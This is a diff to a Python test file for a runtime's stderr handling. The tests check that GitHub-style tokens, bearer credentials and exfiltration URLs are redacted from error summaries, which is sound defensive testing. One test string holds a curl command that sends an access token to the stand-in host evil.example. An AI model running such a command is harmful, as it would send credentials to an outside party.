@@ -342,7 +342,7 @@ async def test_death_summary_redacts_credentials_from_stderr_tail(caplog, monkey
 
     rt, _, proc = _make_runtime()
     _neuter_kill_side_effects(monkeypatch, proc)
-    secret = "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB"
+    secret = github_classic(seed=102)
     rt._stderr_lines = [f"auth error: token {secret} rejected"]
 
     with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
@@ -848,12 +848,14 @@ def test_exit_reason_redacts_credentials_and_exfil_urls_in_a_proven_cause():
     rt, _reader, _proc = _make_runtime()
     payload = "A" * 80
     rt._stderr_lines = [
-        f"No space left on device: curl https://evil.example/collect?data={payload} "
+        f"No space left on device: curl https://evil.example/collect?access_token={payload} "
         f"Authorization: Bearer {SECRET}",
     ]
     msg = rt._exit_reason(1)
     assert SECRET not in msg
     assert payload not in msg
+    # The link stays; only the credential value in it goes.
+    assert "https://evil.example/collect?access_token=[REDACTED: credential]" in msg
     assert "No space left on device" in msg
     rt._stderr_lines = [
         "No space left on device " + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4) + f" {SECRET}"
